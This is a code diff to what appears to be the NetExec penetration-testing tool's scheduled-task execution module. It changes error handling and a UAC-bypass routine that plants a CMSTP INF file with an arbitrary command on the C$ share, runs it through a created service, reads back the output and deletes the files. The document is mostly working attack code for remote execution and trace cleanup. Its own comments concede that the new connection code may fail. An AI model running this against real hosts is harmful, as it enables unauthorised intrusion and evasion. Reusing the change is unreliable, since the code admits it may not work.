@@ -2,6 +2,7 @@ import os
 from impacket.dcerpc.v5 import tsch, transport
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.nmb import NetBIOSTimeout
 from nxc.helpers.misc import gen_random_string
 from time import sleep
 from datetime import datetime, timedelta
@@ -146,7 +147,11 @@ class TSCH_EXEC:
             dce.bind(tsch.MSRPC_UUID_TSCHS)
             tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
         except Exception as e:
-            if e.error_code and hex(e.error_code) == "0x80070005":
+            # Check for NetBIOSTimeout specifically as it doesn't have error_code
+            if isinstance(e, NetBIOSTimeout):
+                 self.logger.fail(f"ATEXEC: Timeout during task registration: {e}")
+            # Check for access denied error code
+            elif hasattr(e, 'error_code') and e.error_code and hex(e.error_code) == "0x80070005":
                 self.logger.fail("ATEXEC: Create schedule task got blocked.")
             else:
                 self.logger.fail(str(e))
@@ -229,23 +234,23 @@ class TSCH_EXEC:
         inf_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
         self.__output_filename = output_file
         
-        # Use the main TSCH_EXEC SMB connection (self.conn)
+        # Connect to SMB to write our INF file
+        smbConnection = None # Initialize to None
         
         try:
-            # Ensure the main SMB connection is established
-            if not hasattr(self, 'conn') or not self.conn:
-                self.logger.debug("Main SMB connection not found or initialized in __bypassuac_cmstplua, establishing...")
-                # Assuming self.connect() initializes self.conn appropriately
-                # If self.connect() isn't the right method, this needs adjustment
-                # based on how TSCH_EXEC establishes its primary SMB connection.
-                # For now, we rely on the structure where self.conn is expected
-                # to be available after TSCH_EXEC initialization.
-                # If direct initialization is needed, it might look like:
-                # self.connect() # Re-evaluate if this truly sets self.conn
-                # Or perhaps self.conn = self.__rpctransport.get_smb_connection() after __rpctransport.connect()
-                # We need to ensure self.conn is a valid SMBConnection object here.
-                # Adding a direct call to self.connect() as a safety measure.
-                self.connect()
+            # Prepare the string binding for SMB - Original approach
+            # This transport might not provide a full SMBConnection object with putFile
+            stringBinding = r"ncacn_np:%s[\\pipe\\srvsvc]" % self.__target
+            rpctransport = transport.DCERPCTransportFactory(stringBinding)
+            if hasattr(rpctransport, "set_credentials"):
+                rpctransport.set_credentials(
+                    self.__username, self.__password, self.__domain,
+                    self.__lmhash, self.__nthash, self.__aesKey
+                )
+                rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+            
+            # Attempt to get the connection - This might fail or return an incomplete object
+            smbConnection = rpctransport.get_smb_connection() 
 
             # Create the INF file content for CMSTP
             # This will execute our command via a COM object method
@@ -271,9 +276,9 @@ UnRegisterOCXs=UnRegisterOCXSection
             # Add our command to the INF
             inf_content += f'"{cmd}"'
             
-            # Write the INF file to the C$ share using self.conn
+            # Write the INF file to the C$ share using the obtained smb_connection
             self.logger.debug(f"Writing INF file to {self.__share}\\\\\\\\{inf_file}.inf")
-            self.conn.putFile(self.__share, f"{inf_file}.inf", inf_content.encode())
+            smbConnection.putFile(self.__share, f"{inf_file}.inf", inf_content.encode())
             
             # Create a service to run CMSTP with our INF file
             scm_rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\\\\pipe\\\\svcctl]" % self.__target)
@@ -328,8 +333,8 @@ UnRegisterOCXs=UnRegisterOCXSection
             svcctl.hRCloseServiceHandle(scm_dce, service_handle)
             
             try:
-                # Use self.conn to delete the file
-                self.conn.deleteFile(self.__share, f"{inf_file}.inf")
+                # Use the obtained smb_connection to delete the file
+                smbConnection.deleteFile(self.__share, f"{inf_file}.inf")
             except Exception as e:
                 self.logger.debug(f"Error deleting INF file: {e}")
             
@@ -340,11 +345,11 @@ UnRegisterOCXs=UnRegisterOCXSection
                 
                 self.__outputBuffer = b""
                 
-                # Try to get the output file using self.conn
+                # Try to get the output file using the obtained smb_connection
                 for attempt in range(self.__tries):
                     try:
                         self.logger.info(f"Attempting to read {self.__share}\\\\\\\\{output_file}")
-                        self.conn.getFile(self.__share, output_file, self.output_callback)
+                        smbConnection.getFile(self.__share, output_file, self.output_callback)
                         break
                     except Exception as e:
                         if attempt == self.__tries - 1:
@@ -352,10 +357,10 @@ UnRegisterOCXs=UnRegisterOCXSection
                         else:
                             self.logger.debug(f"Error getting output (attempt {attempt+1}/{self.__tries}): {e}")
                             sleep(2)
-                # Clean up the output file using self.conn
+                # Clean up the output file using the obtained smb_connection
                 try:
                     self.logger.debug(f"Deleting output file: {output_file}")
-                    self.conn.deleteFile(self.__share, output_file)
+                    smbConnection.deleteFile(self.__share, output_file)
                 except Exception as e:
                     self.logger.debug(f"Error deleting output file: {e}")
             # Ensure connection is closed
